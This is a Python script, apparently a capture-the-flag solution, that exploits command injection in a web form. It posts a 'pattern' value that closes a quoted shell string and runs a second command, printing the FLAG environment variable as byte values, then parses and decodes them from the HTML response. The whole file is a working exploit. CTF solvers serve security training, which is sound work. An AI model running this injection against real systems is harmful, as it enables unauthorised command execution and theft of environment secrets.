#!/usr/bin/env python3

from __future__ import annotations

import re
import sys

import requests


def main() -> int:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        return 1

    base_url = sys.argv[1].rstrip("/")
    payload = '^$"; printf %s "$FLAG" | od -An -tu1; echo "'

    response = requests.post(
        f"{base_url}/",
        data={"pattern": payload},
        timeout=10,
    )
    response.raise_for_status()

    output_match = re.search(
        r"Command output</p>\s*<pre[^>]*>([^<]+)</pre>",
        response.text,
        re.IGNORECASE,
    )
    if not output_match:
        print("Command output block not found in response")
        return 2

    numbers = [int(value) for value in re.findall(r"\d+", output_match.group(1))]
    if not numbers:
        print("Integer flag data not found in response")
        return 3

    try:
        decoded = bytes(numbers).decode("utf-8")
    except ValueError:
        print("Response contained integers outside byte range")
        return 4

    match = re.search(r"REDACTED\{[^\s]+\}", decoded)
    if not match:
        print("Decoded flag not found")
        return 5

    print(match.group(0))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
